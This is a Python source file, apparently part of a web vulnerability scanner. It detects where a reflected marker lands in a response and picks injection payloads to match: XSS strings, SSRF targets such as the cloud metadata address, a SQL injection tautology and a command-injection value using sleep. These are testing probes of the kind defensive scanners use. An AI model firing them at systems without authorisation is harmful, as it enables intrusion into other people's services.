import re


class ContextEngine:
    """
    Context-aware payload selection engine.
    Detects where user input lands and chooses correct payloads.
    """

    HTML = "html"
    ATTRIBUTE = "attribute"
    JS = "javascript"
    JSON = "json"
    URL = "url"
    UNKNOWN = "unknown"

    def detect_context(self, response_text: str, marker: str) -> str:
        if not response_text:
            return self.UNKNOWN

        idx = response_text.find(marker)

        if idx == -1:
            return self.UNKNOWN

        # small window around injection
        window = response_text[max(0, idx - 120): idx + 120]

        # JSON context
        if re.search(r'"\s*:\s*".*' + re.escape(marker), window):
            return self.JSON

        # JavaScript context
        if "<script" in window or "function(" in window:
            return self.JS

        # Attribute context
        if re.search(r'=\s*["\'].*' + re.escape(marker), window):
            return self.ATTRIBUTE

        # HTML body context
        if re.search(r'>[^<]*' + re.escape(marker), window):
            return self.HTML

        return self.UNKNOWN

    def get_payloads(self, context: str):
        payloads = {
            self.HTML: [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>"
            ],

            self.ATTRIBUTE: [
                '" onmouseover=alert(1) x="',
                "' onfocus=alert(1) autofocus '",
                '" onclick=alert(1) "'
            ],

            self.JS: [
                "';alert(1);//",
                '";alert(1);//',
                "`;alert(1)//"
            ],

            self.JSON: [
                '"};alert(1);//',
                '"}];alert(1);//'
            ],

            self.URL: [
                "http://127.0.0.1",
                "http://169.254.169.254"
            ],

            self.UNKNOWN: [
                "<script>alert(1)</script>",
                "' OR 1=1--",
                "`;sleep 5`"
            ]
        }

        return payloads.get(context, payloads[self.UNKNOWN])